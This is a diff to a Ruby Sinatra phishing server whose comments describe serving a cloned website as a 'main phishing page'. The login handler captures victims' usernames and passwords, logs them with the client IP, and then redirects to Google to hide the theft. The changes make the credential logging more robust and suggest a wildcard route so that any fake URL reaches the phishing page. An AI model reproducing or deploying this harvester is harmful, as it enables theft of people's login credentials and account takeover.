@@ -26,12 +26,18 @@ end
 configure {
   set :port, 8181
   set :environment, :production
-  set :public_folder, File.dirname(__FILE__) + '/views'
+  set :root, File.dirname(__FILE__)
+  set :public_folder, Proc.new { File.join(root, '/views') }
   set :show_exceptions, false
 }
 enable :sessions
 
-# Put your cloned website under 'views' directory 
+# Put your cloned website under 'views' directory
+# To accept any fake URL to your main phishing page add asterisk (*) after the route
+# example:
+#   get '/*' do
+#     # code
+#   end
 get '/' do
   erb 'PATH/TO/LOGIN_PAGE'.to_sym
 end
@@ -42,7 +48,7 @@ post '/login' do
     username = params['UserName']
     password = params['Password']
     ip_addr  = @env['HTTP_X_REAL_IP']           # request.env['REMOTE_ADDR'].split(',').first
-    logger.info(username +':'+ password +':'+ ip_addr)
+    logger.info(username.to_s +':'+ password.to_s +':'+ ip_addr.to_s)
     redirect 'https://google.com'               # Redirect user to google After submitting the form
   else
     erb '/'.to_sym
